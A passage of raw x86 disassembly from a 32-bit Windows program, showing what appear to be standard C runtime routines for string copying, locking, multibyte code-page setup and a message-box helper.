  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
